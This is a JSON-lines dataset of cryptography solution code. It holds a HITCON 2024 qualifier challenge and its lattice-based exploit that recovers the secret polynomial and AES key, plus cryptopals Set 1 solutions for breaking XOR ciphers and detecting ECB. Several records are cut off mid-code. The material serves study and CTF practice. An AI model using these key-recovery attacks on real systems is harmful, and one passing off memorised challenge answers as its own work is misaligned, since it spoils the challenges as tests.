{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\hyper512\\solve\\get_flag.py", "category": "crypto", "solution_code": "from chall import Cipher\n# x1[0] = 0, x2[0] = 0, x2[1] = 1\nsol = (\n    1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, ", "name": "get_flag"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\broken-share\\challenge\\chall.py", "category": "crypto", "solution_code": "import numpy as np\nfrom Crypto.Cipher import AES\nfrom hashlib import sha256\nfrom random import SystemRandom\nimport sys\n\np = 65537\nrand = SystemRandom()\n\n\ndef share(secret: bytes, n: int, t: int):\n    # (t, n) secret sharing\n    poly = np.array([rand.randrange(0, p) for _ in range(t)])\n    f = lambda x: int(np.polyval(poly, x) % p)\n\n    xs = rand.sample(range(t, p), n)\n    ys = [f(x) for x in xs]\n    shares = [(int(x), int(y)) for x, y in zip(xs, ys)]\n\n    ks = [f(x) for x in range(t)]\n    key = sha256(repr(ks).encode()).digest()\n    cipher = AES.new(key, AES.MODE_CTR)\n    ct = cipher.nonce + cipher.encrypt(secret)\n    return ct, shares\n\n\ndef interpolate(xs: list[int], ys: list[int], x: int):\n    n = len(xs)\n    assert n == len(ys)\n    res = 0\n    for i in range(n):\n        numer, denom = 1, 1\n        for j in range(n):\n            if i == j:\n                continue\n            numer *= x - xs[j]\n            denom *= xs[i] - xs[j]\n        res += ys[i] * numer * pow(denom, -1, p)\n    return res % p\n\n\ndef recover(ct: bytes, shares: list, t: int):\n    xs, ys = zip(*shares[:t])\n    ks = [interpolate(xs, ys, x) for x in range(t)]\n    key = sha256(repr(ks).encode()).digest()\n    cipher = AES.new(key, AES.MODE_CTR, nonce=ct[:8])\n    return cipher.decrypt(ct[8:])\n\n\ndef sanity_check():\n    message = b\"hello world\"\n    ct, shares = share(message, 16, 4)\n    assert recover(ct, shares, 4) == message\n\n\nif __name__ == \"__main__\":\n    sanity_check()\n    with open(\"flag.txt\", \"rb\") as f:\n        flag = f.read().strip()\n    ct, shares = share(flag, 48, 24)\n    print(f\"{ct = }\")\n    print(f\"{shares = }\")\n\n    if recover(ct, shares, 24) != flag:\n        print(\"Failed to recover flag ???\", file=sys.stderr)\n", "name": "chall"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2024\\HITCON-Qual\\broken-share\\solve\\exp.py", "category": "crypto", "solution_code": "from sage.modules.free_module_integer import IntegerLattice\nimport numpy as np\nfrom Crypto.Cipher import AES\nfrom hashlib import sha256\nfrom random import SystemRandom\nimport sys\nfrom sage.all import GF, PolynomialRing, Zmod, matrix, QQ, ZZ, block_matrix, zero_matrix, vector\nfrom copy import copy\n\n\n# https://github.com/rkm0959/Inequality_Solving_with_CVP\ndef Babai_CVP(mat, target):\n    M = mat.LLL()\n    G = M.gram_schmidt()[0]\n    diff = target\n    for i in reversed(range(G.nrows())):\n        diff -= M[i] * ((diff * G[i]) / (G[i] * G[i])).round()\n    return target - diff\n\n\ndef solve(M, lbounds, ubounds, weight=None):\n    mat, lb, ub = copy(M), copy(lbounds), copy(ubounds)\n    num_var = mat.nrows()\n    num_ineq = mat.ncols()\n\n    max_element = 0\n    for i in range(num_var):\n        for j in range(num_ineq):\n            max_element = max(max_element, abs(mat[i, j]))\n\n    if weight == None:\n        weight = num_ineq * max_element\n\n    # sanity checker\n    if len(lb) != num_ineq:\n        print(\"Fail: len(lb) != num_ineq\")\n        return\n\n    if len(ub) != num_ineq:\n        print(\"Fail: len(ub) != num_ineq\")\n        return\n\n    for i in range(num_ineq):\n        if lb[i] > ub[i]:\n            print(\"Fail: lb[i] > ub[i] at index\", i)\n            return\n\n    # heuristic for number of solutions\n    DET = 0\n\n    if num_var == num_ineq:\n        DET = abs(mat.det())\n        num_sol = 1\n        for i in range(num_ineq):\n            num_sol *= (ub[i] - lb[i])\n        if DET == 0:\n            print(\"Zero Determinant\")\n        else:\n            num_sol //= DET\n            # + 1 added in for the sake of not making it zero...\n            print(\"Expected Number of Solutions : \", num_sol + 1)\n\n    # scaling process begins\n    max_diff = max([ub[i] - lb[i] for i in range(num_ineq)])\n    applied_weights = []\n\n    for i in range(num_ineq):\n        ineq_weight = weight if lb[i] == ub[i] else max_diff // (ub[i] - lb[i])\n        applied_weights.append(ineq_weight)\n        for j in range(num_var):\n            mat[j, i] *= ineq_weight\n        lb[i] *= ineq_weight\n        ub[i] *= ineq_weight\n\n    # Solve CVP\n    target = vector([(lb[i] + ub[i]) // 2 for i in range(num_ineq)])\n    result = Babai_CVP(mat, target)\n\n    for i in range(num_ineq):\n        if (lb[i] <= result[i] <= ub[i]) == False:\n            print(\"Fail : inequality does not hold after solving\")\n            break\n\n    # recover x\n    fin = None\n\n    if DET != 0:\n        mat = mat.transpose()\n        fin = mat.solve_right(result)\n\n    # recover your result\n    return result, applied_weights, fin\n\ndef recover(ct: bytes, poly: list, t: int):\n    poly = np.array(poly)\n    f = lambda x: int(np.polyval(poly, x) % p)\n    ks = [f(x) for x in range(t)]\n    key = sha256(repr(ks).encode()).digest()\n    cipher = AES.new(key, AES.MODE_CTR, nonce=ct[:8])\n    return cipher.decrypt(ct[8:])\n\nn = 48\nt = 24\nct = b'\\xa4\\x17#U\\x9d[2Sg\\xb9\\x99B\\xe8p\\x8b\\x0b\\x14\\xf0\\x04\\xde\\x88\\xb9\\xf6\\xceM/\\xea\\xbf\\x15\\x99\\xd7\\xaf\\x8c\\xa1t\\xa4%~c%\\xd2\\x1dNl\\xbaF\\x92\\xae(\\xca\\xf8$+\\xebd;^\\xb8\\xb3`\\xf0\\xed\\x8a\\x9do'\nshares = [(18565, 15475), (4050, 20443), (7053, 28908), (46320, 10236), (12604, 25691), (34890, 55908), (20396, 47463), (16840, 10456), (29951, 4074), (43326, 55872), (15136, 21784), (42111, 55432), (32311, 30534), (28577, 18600), (35425, 34192), (38838, 6433), (40776, 31807), (29826, 36077), (39458, 24811), (32328, 28111), (38079, 11245), (36995, 27991), (26261, 59236), (42176, 20756),\n          (11071, 50313), (31327, 7724), (14212, 45911), (22884, 22299), (18878, 50951), (23510, 24001), (61462, 57669), (46222, 34450), (29, 5836), (50316, 15548), (24558, 15321), (9571, 19074), (11188, 44856), (36698, 40296), (6125, 33078), (42862, 49258), (22439, 56745), (37914, 56174), (53950, 16717), (17342, 59992), (48528, 39826), (59647, 57687), (30823, 36629), (65052, 7106)]\n\n\np = 65537\nmod = 2**64\npinv = int(pow(p, -1, mod))\npinv_div_2 = ZZ(pinv) / ZZ(2)\nn_point = len(shares)\ndegree = t\nmat11 = matrix(ZZ, degree + 1, n_point)\nbound = mod // p\n\n\nfor i in range(n_point):\n    x, y = shares[i]\n    for j in range(degree):\n        mat11[j, i] = int(pow(x, j, mod) * pinv % mod)\n    mat11[degree, i] = int(-(y) * pinv % mod)\n\nmat12 = matrix.identity(ZZ, degree + 1)\nmat13 = zero_matrix(ZZ, degree + 1, n_point)\n\nmat21 = matrix.identity(ZZ, n_point) * mod\nmat22 = zero_matrix(ZZ, n_point, degree + 1)\nmat23 = zero_matrix(ZZ, n_point, n_point)\n\nmat31 = matrix.identity(ZZ, n_point) * -pinv\nmat32 = zero_matrix(ZZ, n_point, degree + 1)\nmat33 = matrix.identity(ZZ, n_point, n_point)\n\n\nM = block_matrix(ZZ, [[mat11, mat12, mat13],\n                      [mat21, mat22, mat23],\n                      [mat31, mat32, mat33]])\n\nmod = 2**64\np = 65537\nbound = mod // p\nlb = [0] * n_point + [0] * degree + [1] + [0] * n_point\nub = [bound] * n_point + [p] * degree + [1] + [1] * n_point\n# solve CVP\nres, weights, fin = solve(M, lb, ub)\nprint(res)\n\nrcoeffs =  [res[i]//weights[i] for i in range(n_point, n_point + degree)]\nprint(rcoeffs)\npoly = rcoef", "name": "exp"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C01.py", "category": "crypto", "solution_code": "from enum import Enum\n\nb64_encoding_table = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk\" \\\n                     \"lmnopqrstuvwxyz0123456789+/\"\n\n\nclass Status(Enum):\n    \"\"\"Represents the possible status of the converter\n    upon finishing to read a hex character of 4 bits.\n    \"\"\"\n    START_NEW = 0\n    TAKE_2 = 1\n    TAKE_4 = 2\n\n\ndef hex_to_base64(hexdata):\n    \"\"\"Returns a Base64 encoding of the given Hexadecimal string.\"\"\"\n    b64data = \"\"                # Encoding which will be returned\n\n    sixbits = 0                 # Group of six bits that are being encoded\n    status = Status.START_NEW   # Status of the conversion\n\n    for hexchar in hexdata:\n        dec = int(hexchar, 16)   # Decimal value of the character\n\n        # If a new group of six has to be considered,\n        # take all the 4 bits of the current hex characters\n        # and save in the status that we still need 2 bits.\n        if status == Status.START_NEW:\n            sixbits = dec\n            status = Status.TAKE_2\n\n        # If only 2 bits need to be considered, append them to\n        # the current group of six bits. The group, now complete,\n        # is then encoded and added to the encoded string.\n        # The next 2 bits are added to a new group and the status\n        # is set to say that we still need 4 bits.\n        elif status == Status.TAKE_2:\n            sixbits = (sixbits << 2) | (dec >> 2)\n            b64data += b64_encoding_table[sixbits]\n            sixbits = (dec & 0x3)   # 0x3 is 0011\n            status = Status.TAKE_4\n\n        # If only 4 bits need to be considered, append them to\n        # the current group of six bits. The group, now complete,\n        # is then encoded and added to the encoded string.\n        # The status is set to say that we can start with a new group.\n        elif status == Status.TAKE_4:\n            sixbits = (sixbits << 4) | dec\n            b64data += b64_encoding_table[sixbits]\n            status = Status.START_NEW\n\n    # If there are still 2 bits missing to the current group of six bits\n    # encode the last character by appending two 0s to it.\n    # Then add \"=\" to the encoding.\n    if status == Status.TAKE_2:\n        sixbits <<= 2\n        b64data += b64_encoding_table[sixbits]\n        b64data += \"=\"\n\n    # If there are still 4 bits missing to the current group of six bits\n    # encode the last character by appending four 0s to it.\n    # Then add \"==\" to the encoding.\n    elif status == Status.TAKE_4:\n        sixbits <<= 4\n        b64data += b64_encoding_table[sixbits]\n        b64data += \"==\"\n\n    return b64data\n\n\ndef main():\n    # Check that the method works properly\n    assert hex_to_base64(\"49276d206b696c6c696e6720796f757220627261696e206c696b\"\n                         \"65206120706f69736f6e6f7573206d757368726f6f6d\") ==\\\n           \"SSdtIGtpbGxpbmcgeW91ciBicmFpbiBsaWtlIGEgcG9pc29ub3VzIG11c2hyb29t\"\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S1C01"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C02.py", "category": "crypto", "solution_code": "def hex_xor(hexdata1, hexdata2):\n    \"\"\"Takes two equal-length hex encoded buffers and produces their XOR combination.\"\"\"\n    dec1 = int(hexdata1, 16)\n    dec2 = int(hexdata2, 16)\n    xor = dec1 ^ dec2\n    return hex(xor)[2:]\n\n\ndef main():\n    # Check that the method works properly\n    assert hex_xor(\"1c0111001f010100061a024b53535009181c\", \"686974207468652062756c6c277320657965\") ==\\\n           \"746865206b696420646f6e277420706c6179\"\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S1C02"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C03.py", "category": "crypto", "solution_code": "# http://www.data-compression.com/english.html\nCHARACTER_FREQ = {\n    'a': 0.0651738, 'b': 0.0124248, 'c': 0.0217339, 'd': 0.0349835, 'e': 0.1041442, 'f': 0.0197881, 'g': 0.0158610,\n    'h': 0.0492888, 'i': 0.0558094, 'j': 0.0009033, 'k': 0.0050529, 'l': 0.0331490, 'm': 0.0202124, 'n': 0.0564513,\n    'o': 0.0596302, 'p': 0.0137645, 'q': 0.0008606, 'r': 0.0497563, 's': 0.0515760, 't': 0.0729357, 'u': 0.0225134,\n    'v': 0.0082903, 'w': 0.0171272, 'x': 0.0013692, 'y': 0.0145984, 'z': 0.0007836, ' ': 0.1918182\n}\n\n\ndef get_english_score(input_bytes):\n    \"\"\"Returns a score which is the sum of the probabilities in how each letter of the input data\n    appears in the English language. Uses the above probabilities.\n    \"\"\"\n    score = 0\n\n    for byte in input_bytes:\n        score += CHARACTER_FREQ.get(chr(byte).lower(), 0)\n\n    return score\n\n\ndef singlechar_xor(input_bytes, key_value):\n    \"\"\"XORs every byte of the input with the given key_value and returns the result.\"\"\"\n    output = b''\n\n    for char in input_bytes:\n        output += bytes([char ^ key_value])\n\n    return output\n\n\ndef singlechar_xor_brute_force(ciphertext):\n    \"\"\"Tries every possible byte for the single-char key, decrypts the ciphertext with that byte\n    and computes the english score for each plaintext. The plaintext with the highest score\n    is likely to be the one decrypted with the correct value of key.\n    \"\"\"\n    candidates = []\n\n    for key_candidate in range(256):\n        plaintext_candidate = singlechar_xor(ciphertext, key_candidate)\n        candidate_score = get_english_score(plaintext_candidate)\n\n        result = {\n            'key': key_candidate,\n            'score': candidate_score,\n            'plaintext': plaintext_candidate\n        }\n\n        candidates.append(result)\n\n    # Return the candidate with the highest English score\n    return sorted(candidates, key=lambda c: c['score'], reverse=True)[0]\n\n\ndef pretty_print_result(result):\n    \"\"\"Prints the given resulting candidate in a pretty format.\"\"\"\n    print(result['plaintext'].decode().rstrip(), \"\\tScore:\", \"{0:.2f}\".format(result['score']),\n          \"\\tKey:\", chr(result['key']))\n\n\ndef main():\n    ciphertext = bytes.fromhex(\"1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736\")\n    most_likely_plaintext = singlechar_xor_brute_force(ciphertext)\n    pretty_print_result(most_likely_plaintext)\n\n    # Check that the attack works properly\n    assert most_likely_plaintext['plaintext'].rstrip() == b\"Cooking MC's like a pound of bacon\"\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S1C03"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C04.py", "category": "crypto", "solution_code": "from S1C03 import singlechar_xor_brute_force, pretty_print_result\n\n\ndef detect_encrypted_text(encrypted_strings):\n    \"\"\"Performs a singlechar XOR brute force attack to every ciphertext of the input, gets a plaintext\n    from each of the ciphertexts and returns the decrypted plaintext which has the highest English score.\n    \"\"\"\n    candidates = []\n\n    for string in encrypted_strings:\n        candidates.append(singlechar_xor_brute_force(string))\n\n    # Return the candidate with the highest English score\n    return sorted(candidates, key=lambda c: c['score'], reverse=True)[0]\n\n\ndef main():\n    ciphertexts = [bytes.fromhex(line.strip()) for line in open(\"S1C04_input.txt\")]\n    most_likely_plaintext = detect_encrypted_text(ciphertexts)\n    pretty_print_result(most_likely_plaintext)\n\n    # Check that the attack works properly\n    assert most_likely_plaintext['plaintext'].rstrip() == b\"Now that the party is jumping\"\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S1C04"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C05.py", "category": "crypto", "solution_code": "from binascii import hexlify\n\n\ndef repeating_key_xor(plaintext, key):\n    \"\"\"Implements the repeating-key XOR encryption.\"\"\"\n    ciphertext = b''\n    i = 0\n\n    for byte in plaintext:\n        ciphertext += bytes([byte ^ key[i]])\n\n        # Cycle i to point to the next byte of the key\n        i = i + 1 if i < len(key) - 1 else 0\n\n    return ciphertext\n\n\ndef main():\n    c = repeating_key_xor(b\"Burning 'em, if you ain't quick and nimble\\nI go crazy when I hear a cymbal\", b'ICE')\n\n    # Check that the encryption works properly\n    assert (str(hexlify(c), \"utf-8\") == \"0b3637272a2b2e63622c2e69692a23693a2a3c6324202d623d63343c2a2622632427276527\"\n                                        \"2a282b2f20430a652e2c652a3124333a653e2b2027630c692b20283165286326302e27282f\")\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S1C05"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C06.py", "category": "crypto", "solution_code": "from base64 import b64decode\nfrom S1C03 import singlechar_xor_brute_force, get_english_score\nfrom S1C05 import repeating_key_xor\nfrom itertools import combinations\n\n\ndef hamming_distance(binary_seq_1, binary_seq_2):\n    \"\"\"Computes the edit distance/Hamming distance between two equal-length strings.\"\"\"\n    assert len(binary_seq_1) == len(binary_seq_2)\n    dist = 0\n\n    for bit1, bit2 in zip(binary_seq_1, binary_seq_2):\n        diff = bit1 ^ bit2\n        dist += sum([1 for bit in bin(diff) if bit == '1'])\n\n    return dist\n\n\ndef break_repeating_key_xor(binary_data):\n    \"\"\"Breaks the repeating key XOR encryption statistically.\"\"\"\n    normalized_distances = {}\n\n    # For each key_size (from the suggested range)\n    for key_size in range(2, 41):\n\n        # Take the first four key_size worth of bytes (as suggested as an option)\n        chunks = [binary_data[i:i + key_size] for i in range(0, len(binary_data), key_size)][:4]\n\n        # Sum the hamming distances between each pair of chunks\n        distance = 0\n        pairs = combinations(chunks, 2)\n        for (x, y) in pairs:\n            distance += hamming_distance(x, y)\n\n        # And compute the average distance\n        distance /= 6\n\n        # Normalize the result by dividing by key_size\n        normalized_distance = distance / key_size\n\n        # Store the normalized distance for the given key_size\n        normalized_distances[key_size] = normalized_distance\n\n    # The key_sizes with the smallest normalized edit distances are the most likely ones\n    possible_key_sizes = sorted(normalized_distances, key=normalized_distances.get)[:3]\n    possible_plaintexts = []\n\n    # Now we can try which one is really the correct one among the top 3 most likely key_sizes\n    for d in possible_key_sizes:\n        key = b''\n\n        # Break the ciphertext into blocks of key_size length\n        for i in range(d):\n            block = b''\n\n            # Transpose the blocks: make a block that is the i-th byte of every block\n            for j in range(i, len(binary_data), d):\n                block += bytes([binary_data[j]])\n\n            # Solve each block as if it was single-character XOR\n            key += bytes([singlechar_xor_brute_force(block)['key']])\n\n        # Store the candidate plaintext that we would get with the key that we just found\n        possible_plaintexts.append((repeating_key_xor(binary_data, key), key))\n\n    # Return the candidate with the highest English score\n    return max(possible_plaintexts, key=lambda k: get_english_score(k[0]))\n\n\ndef main():\n\n    # Check that the hamming distance function works properly\n    assert hamming_distance(b'this is a test', b'wokka wokka!!!') == 37\n\n    with open(\"S1C06_input.txt\") as input_file:\n        data = b64decode(input_file.read())\n\n    # Compute and print the result of the attack\n    result = break_repeating_key_xor(data)\n    print(\"Key =\", result[1].decode())\n    print(\"---------------------------------------\")\n    print(result[0].decode().rstrip())\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S1C06"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C07.py", "category": "crypto", "solution_code": "from base64 import b64decode\nfrom Crypto.Cipher import AES\nfrom S2C09 import pkcs7_unpad\n\n\ndef aes_ecb_decrypt(data, key):\n    \"\"\"Decrypts the given AES-ECB encrypted data with the given key.\n    The un-padding part has been added to support the use that I will make of this\n    method on future challenges (for the sake of this challenge it's not needed).\n    \"\"\"\n    cipher = AES.new(key, AES.MODE_ECB)\n    return pkcs7_unpad(cipher.decrypt(data))\n\n\ndef main():\n    with open(\"S1C07_input.txt\") as input_file:\n        binary_data = b64decode(input_file.read())\n\n    # Compute and print the decrypted plaintext\n    print(aes_ecb_decrypt(binary_data, b'YELLOW SUBMARINE').decode().rstrip())\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S1C07"}
{"source": "cryptopals", "path": "data\\cryptopals\\S1C08.py", "category": "crypto", "solution_code": "from Crypto.Cipher.AES import block_size\n\n\ndef count_aes_ecb_repetitions(ciphertext):\n    \"\"\"Counts the number of repeated chunks of the ciphertext and returns it.\"\"\"\n    chunks = [ciphertext[i:i + block_size] for i in range(0, len(ciphertext), block_size)]\n    number_of_duplicates = len(chunks) - len(set(chunks))\n    return number_of_duplicates\n\n\ndef detect_ecb_encrypted_ciphertext(ciphertexts):\n    \"\"\"Detects which ciphertext among the given one is the one most likely encrypted with AES in ECB mode.\"\"\"\n    best = (-1, 0)     # index of best candidate, repetitions of best candidate\n\n    # For each ciphertext\n    for i in range(len(ciphertexts)):\n\n        # Count the block repetitions\n        repetitions = count_aes_ecb_repetitions(ciphertexts[i])\n\n        # Keep the ciphertext with most repetitions\n        best = max(best, (i, repetitions), key=lambda t: t[1])\n\n    # Return the ciphertext with most repetitions\n    return best\n\n\ndef main():\n    ciphertexts = [bytes.fromhex(line.strip()) for line in open(\"S1C08_input.txt\")]\n    result = detect_ecb_encrypted_ciphertext(ciphertexts)\n\n    # Compute and print the ciphertext which was encrypted with 